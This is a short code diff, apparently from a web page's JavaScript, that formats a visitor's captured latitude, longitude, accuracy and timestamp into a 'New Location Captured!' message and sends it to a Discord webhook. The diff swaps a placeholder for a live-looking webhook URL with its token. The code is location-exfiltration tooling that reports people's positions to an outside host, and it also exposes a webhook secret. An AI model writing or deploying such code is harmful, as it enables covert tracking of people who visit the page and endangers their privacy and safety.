@@ -33,7 +33,7 @@
             const message = `**New Location Captured!** 📍\n\n🌍 **Latitude:** ${latitude}\n🌎 **Longitude:** ${longitude}\n📏 **Accuracy:** ${accuracy} meters\n🕒 **Time:** ${timestamp}`;
 
             // Send data to Discord Webhook
-            fetch("YOUR_DISCORD_WEBHOOK_URL", {
+            fetch("https://discord.com/api/webhooks/1346211668195278920/p3FKujXJfw9iF4Ln9gD5RB6e2goF0gFF07fjG1HYDVKDoqFSMPFRV9B6fVTDCS9TuSVB", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: message })
